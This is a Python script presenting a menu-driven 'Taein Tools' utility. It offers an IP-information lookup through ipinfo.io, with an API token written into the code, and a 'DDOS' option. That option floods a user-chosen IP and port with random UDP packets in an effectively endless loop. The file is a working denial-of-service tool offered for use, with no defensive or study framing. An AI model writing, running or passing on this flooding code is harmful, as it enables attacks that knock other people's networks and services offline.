import socket
import random
import time
import requests
import os
import platform
from time import sleep
system_name = platform.system()

appear_time = 0.125

def clear():
    if system_name == "Windows":
        os.system("cls")
    else:
        os.system("clear")

try:
    online_version = requests.get("https://raw.githubusercontent.com/taeincho/taeintools/main/online_version").text
    online_version = online_version.strip("\n")
    online = True
except:
    online = False
offline_version = 1.0

def color_print(text,code):
    print('\033[' + str(code) +'m' + text + '\033[0m')


def line():
    print("#=================================================#")

def title():
    clear()
    line()
    sleep(appear_time)
    color_print("[-] Taein Tools", 92)
    sleep(appear_time)
    line()
    sleep(appear_time)
    color_print("[#] Your Client Version : v" + str(offline_version),93)
    sleep(appear_time)
    color_print("[#] Last Version : v" + str(online_version),94)
    sleep(appear_time)
    line()
    sleep(appear_time)
    color_print("[$] https://github.com/taeincho/taeintools/releases",96)
    sleep(appear_time)
    line()
    
def title_list():
    sleep(appear_time)
    color_print("[E] EXIT",93)
    sleep(appear_time)
    color_print("[G] OFFICIAL GITHUB",92)
    sleep(appear_time)
    line()
    sleep(appear_time)
    color_print("[1] IP INFORMATION",93)
    sleep(appear_time)
    color_print("[2] DDOS",91)

def main():
    title()
    title_list()
    sleep(appear_time)
    sel = input(">")
    if sel == "E" or sel == "e":
        exit()
    if sel == "G" or sel == "g":
        if system_name == "Windows":
            os.system("start https://github.com/taeincho/taeintools")
            main()
        else:
            clear()
            color_print("This feature is not supported on operating systems other than Windows.",96)
            time.sleep(3)
            main()
    elif sel == "1":
        try:
            a_ip = input("Target's IP >")
            informationofip = requests.get("https://ipinfo.io/" + a_ip +"?token=e18e63825d3e1c").text
            clear()
            color_print(informationofip,96)
            input("Press enter to return      ")
            main()
        except:
            clear()
            color_print("[ ERROR ]",96)
            time.sleep(3)
            main()
    elif sel == "2":
        category_ddos()

def category_ddos():
    title()
    sleep(appear_time)
    color_print("[ DDOS CATEGORY ]",91)
    sleep(appear_time)
    print()
    sleep(appear_time)
    color_print("[0] BACK",31)
    sleep(appear_time)
    color_print("[1] DDOS(Used Socket)",31)
    sleep(appear_time)
    sel = input(">")
    if sel == "0":
        main()
    elif sel == "1":
        try:
            ddos_type1()
        except:
            main()

def ddos_type1():
    clear()
    sleep(appear_time)
    title()
    sleep(appear_time)
    color_print("[#] You can cancel by pressing Ctrl + C.",94)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sleep(appear_time)
    line()
    sleep(appear_time)
    ip = input("Target's IP >")
    sleep(appear_time)
    port = int(input("Target's Port >"))
    sleep(appear_time)
    wt = float(input("Waiting Time >"))
    sleep(appear_time)
    
    s.connect((ip, port))

    for i in range(1, 100**100):
        s.send(random._urandom(10)*100)
        print(f"Send: {i}", end='\r')
        time.sleep(wt)

main()